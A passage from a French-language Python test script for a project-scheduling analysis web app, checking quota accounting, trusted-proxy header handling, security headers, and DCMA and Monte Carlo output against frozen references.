    conn.execute("DELETE FROM running")
    conn.commit()

_vrai_run = app.run_script


def _compteur(ip):
    with sqlite3.connect(db) as conn:
        ligne = conn.execute("SELECT count FROM usage WHERE ip = ? AND date = ?",
                             (ip, app.today_key())).fetchone()
    return ligne[0] if ligne else 0


def _poster(ip):
    return client.post("/analyse", data={
        "analysis": "both", "sims": "500",
        "mpp_file": (io.BytesIO(b"<Project/>"), "planning.mpp")},
        content_type="multipart/form-data", headers={"X-Forwarded-For": ip})


try:
    def _delai(cmd, label, token=None):
        raise app.AnalysisError("L'analyse a dépassé le délai maximal.", consumed=True)
    app.run_script = _delai
    _r = _poster("203.0.113.120")
    check("délai dépassé : décompté du quota (occupation non gratuite)",
          _r.status_code == 400 and _compteur("203.0.113.120") == 1, f"={_compteur('203.0.113.120')}")
    check("délai dépassé : le visiteur est prévenu du décompte",
          "décomptée de votre quota" in _html.unescape(_r.get_data(as_text=True)))

    _sortie_dcma = (STAGE / "ref_dcma.txt").read_text(encoding="utf-8")

    def _arret_mc(cmd, label, token=None):
        if "DCMA" in label:
            return _sortie_dcma
        raise app.AnalysisCancelled("stop")
    app.run_script = _arret_mc
    _page = _html.unescape(_poster("203.0.113.121").get_data(as_text=True))
    check("arrêt pendant le Monte Carlo : le diagnostic terminé est annoncé décompté",
          "déjà terminé, a été décompté" in _page and _compteur("203.0.113.121") == 1,
          f"={_compteur('203.0.113.121')}")
finally:
    app.run_script = _vrai_run

_filtre = app.ForwardedFromTrustedProxies(
    lambda environ, start_response: environ.get("HTTP_X_FORWARDED_FOR"), {"192.168.1.141"})
check("proxies de confiance : X-Forwarded-For ignoré hors proxy",
      _filtre({"REMOTE_ADDR": "203.0.113.5", "HTTP_X_FORWARDED_FOR": "1.2.3.4"}, None) is None)
check("proxies de confiance : X-Forwarded-For lu depuis le proxy",
      _filtre({"REMOTE_ADDR": "192.168.1.141", "HTTP_X_FORWARDED_FOR": "1.2.3.4"}, None) == "1.2.3.4")
check("proxies de confiance : sans liste, comportement historique",
      app.ForwardedFromTrustedProxies(lambda e, s: e.get("HTTP_X_FORWARDED_FOR"), frozenset())(
          {"REMOTE_ADDR": "203.0.113.5", "HTTP_X_FORWARDED_FOR": "1.2.3.4"}, None) == "1.2.3.4")

_accueil = client.get("/")
_csp = _accueil.headers.get("Content-Security-Policy", "")
_jeton = re.search(r"'nonce-([^']+)'", _csp)
check("en-têtes : CSP, nosniff, DENY, no-referrer",
      "frame-ancestors 'none'" in _csp and _accueil.headers.get("X-Content-Type-Options") == "nosniff"
      and _accueil.headers.get("X-Frame-Options") == "DENY"
      and _accueil.headers.get("Referrer-Policy") == "no-referrer")
check("en-têtes : le script de la page porte le jeton de la CSP",
      bool(_jeton) and f'<script nonce="{_jeton.group(1)}">' in _accueil.get_data(as_text=True))

# Scripts réels (MPXJ) sur test_liens.xml : deux chemins critiques parallèles de
# 20 j en retard de 3 j, un lien début-début, un lien fin-fin, une contrainte SNLT.
if (STAGE / "test_liens.xml").exists():
    _dcma_liens = app.LOG4J_NOISE.sub("", subprocess.run(
        [sys.executable, str(STAGE / "dcma14.py"), "test_liens.xml"],
        cwd=str(STAGE), capture_output=True, text=True, timeout=300).stdout or "")
    _lignes = {r["num"]: r for r in app.parse_dcma_output(_dcma_liens)["rows"]}
    check("contrainte « début au plus tard le » (SNLT) comptée comme dure",
          _lignes.get(5, {}).get("detail") == "1/7", f"={_lignes.get(5, {}).get('detail')}")
    check("CPLI : chemins parallèles non additionnés, retard pris sur le pire (0,85)",
          _lignes.get(13, {}).get("value") == "0.85", f"={_lignes.get(13, {}).get('value')}")
    _mc_liens = app.LOG4J_NOISE.sub("", subprocess.run(
        [sys.executable, str(STAGE / "montecarlo.py"), "test_liens.xml", "--sims", "200"],
        cwd=str(STAGE), capture_output=True, text=True, timeout=300).stdout or "")
    _mc = app.parse_montecarlo_output(_mc_liens)
    _cpm = next((m["value_num"] for m in _mc["metrics"] if m["key"] == "deterministic"), None)
    check("Monte Carlo : liens SS et FF respectés (CPM 22 j, et non 25 j)", _cpm == 22.0, f"={_cpm}")
    _crit = {c["name"]: c["pct_num"] for c in _mc["criticality"]}
    check("Monte Carlo : la tâche liée début-début avec marge n'est jamais critique",
          _crit.get("B — debut-debut sur A") == 0.0, f"={_crit}")
    _csv_mauvais = CHECK_DIR / "estimations_incoherentes.csv"
    _csv_mauvais.write_text("task_id;optimistic;most_likely;pessimistic\n1;5;10;8\n", encoding="utf-8")
    _refus = subprocess.run(
        [sys.executable, str(STAGE / "montecarlo.py"), "test_liens.xml", "--sims", "50",
         "--estimates", str(_csv_mauvais)],
        cwd=str(STAGE), capture_output=True, text=True, timeout=300)
    check("estimations : probable hors [optimiste, pessimiste] refusée avec motif",
          _refus.returncode == 2 and "ESTIMATIONS_INVALIDES: ligne 2 (tache 1)" in _refus.stderr,
          f"code {_refus.returncode} : {_refus.stderr[-160:]}")
else:
    check("fixture test_liens.xml présente", False, "absente")


# --------------------------------------------------------------------------
section("Non-régression : sortie par défaut de dcma14.py et montecarlo.py")
import hashlib  # noqa: E402
check("dcma14.py : sortie par défaut inchangée malgré l'option --details",
      (STAGE / "ref_dcma.txt").exists() and "DETAILS_TACHES" not in (STAGE / "ref_dcma.txt").read_text(encoding="utf-8"),
      "référence absente")
check("montecarlo.py : référence conservée",
      (STAGE / "ref_mc.txt").exists())

# Même exigence que pour dcma14.py : la référence Monte Carlo est comparée à une
# exécution réelle. Le script tire ses nombres d'un générateur à graine fixe, donc
# la sortie est reproductible à nombre de simulations constant.
mc_reference = (STAGE / "ref_mc.txt").read_text(encoding="utf-8").strip()
if (STAGE / "test_projet.xml").exists():
    execution_mc = subprocess.run(
        [sys.executable, str(STAGE / "montecarlo.py"), "test_projet.xml", "--sims", "500"],
        cwd=str(STAGE), capture_output=True, text=True, timeout=600)
    obtenu_mc = app.LOG4J_NOISE.sub("", execution_mc.stdout or "").strip()
    if execution_mc.returncode != 0:
        check("montecarlo.py : exécution de référence", False,
              f"code {execution_mc.returncode} : {(execution_mc.stderr or '')[-200:]}")
    else:
        if obtenu_mc == mc_reference:
            check("montecarlo.py : sortie identique à la référence figée", True)
        else:
            ecarts = [f"{a!r} != {b!r}" for a, b in
                      zip(mc_reference.splitlines(), obtenu_mc.splitlines()) if a != b][:3]
            check("montecarlo.py : sortie identique à la référence figée", False,
                  f"{len(obtenu_mc.splitlines())} lignes contre "
                  f"{len(mc_reference.splitlines())} ; " + " | ".join(ecarts))
else:
    check("montecarlo.py : fixture test_projet.xml présente", False, "absente")
check("dcma14.py : l'option --details est bien opt-in",
      "COLLECT_DETAILS = False" in (STAGE / "dcma14.py").read_text(encoding="utf-8")
      and "--details" in (STAGE / "dcma14.py").read_text(encoding="utf-8"))

# Répartition par macro-tâche : option opt-in, moteur de simulation inchangé.
if (STAGE / "test_projet.xml").exists():

    def lancer_mc(arguments):
        return app.LOG4J_NOISE.sub("", subprocess.run(
            [sys.executable, str(STAGE / "montecarlo.py"), "test_projet.xml", "--sims", "200"]
            + arguments, cwd=str(STAGE), capture_output=True, text=True, timeout=600).stdout or "")

    mc_sans_option = lancer_mc([])
    mc_avec_option = lancer_mc(["--macro-level", "1"])

    def lignes_globales(texte):
        return [l for l in texte.splitlines()
                if l.startswith(("Duree deterministe", "P50 ", "P80 ", "P90 "))]

    check("montecarlo.py : --macro-level n'altère pas le résultat global",
          bool(lignes_globales(mc_sans_option))
          and lignes_globales(mc_sans_option) == lignes_globales(mc_avec_option),
          f"={lignes_globales(mc_avec_option)}")
    check("montecarlo.py : section macro absente sans l'option",
          "Repartition par macro-tache" not in mc_sans_option)
    check("montecarlo.py : répartition par macro-tâche avec l'option",
          "Repartition par macro-tache (niveau 1) :" in mc_avec_option
          and "Phase 1 — Conception" in mc_avec_option
          and "Taches hors lot" in mc_avec_option)
    lignes_macro = [l for l in mc_avec_option.splitlines() if l.lstrip().startswith("Phase")]
    check("montecarlo.py : trois groupes attendus au niveau 1",
          len(lignes_macro) == 2, f"={len(lignes_macro)}")
    check("montecarlo.py : niveau inexistant signalé avec les niveaux disponibles",
          "Aucune tache recapitulative au niveau 9" in lancer_mc(["--macro-level", "9"])
          and "niveaux disponibles" in lancer_mc(["--macro-level", "9"]))
    app.parse_montecarlo_output(mc_sans_option)  # témoin
    check("application : la section macro n'alimente pas la criticité",
          [c["name"] for c in app.parse_montecarlo_output(mc_avec_option)["criticality"]]
          == [c["name"] for c in app.parse_montecarlo_output(mc_sans_option)["criticality"]],
          f"={[c['name'] for c in app.parse_montecarlo_output(mc_avec_option)['criticality']][:3]}")

# La référence doit être réellement comparée à une exécution : sans cela, le
# fichier pouvait pourrir sans que rien ne le signale (c'était le cas : le
# contrôle ne vérifiait que sa présence).
reference = (STAGE / "ref_dcma.txt").read_text(encoding="utf-8").strip()
if (STAGE / "test_projet.xml").exists():
    execution = subprocess.run(
        [sys.executable, str(STAGE / "dcma14.py"), "test_projet.xml"],
        cwd=str(STAGE), capture_output=True, text=True, timeout=300)
    obtenu = app.LOG4J_NOISE.sub("", execution.stdout or "").strip()
    if execution.returncode != 0:
        check("dcma14.py : exécution de référence", False,
              f"code {execution.returncode} : {(execution.stderr or '')[-200:]}")
    else:
        if obtenu == reference:
            check("dcma14.py : sortie identique à la référence figée (14 contrôles)", True)
        else:
            diff = [f"{a!r} != {b!r}" for a, b in zip(reference.splitlines(), obtenu.splitlines())
                    if a != b][:3]
            check("dcma14.py : sortie identique à la référence figée (14 contrôles)", False,
                  f"{len(obtenu.splitlines())} lignes contre {len(reference.splitlines())} ; "
                  + " | ".join(diff))
else:
    check("dcma14.py : fixture test_projet.xml présente", False, "absente")

print(f"\n{'=' * 60}\n{CHECKS[0] - len(FAILS)}/{CHECKS[0]} vérifications OK")
if FAILS:
    print(f"ÉCHECS ({len(FAILS)}) :")
    for f in FAILS:
        print(f"  - {f}")
    sys.exit(1)
print("Tout est vert.")
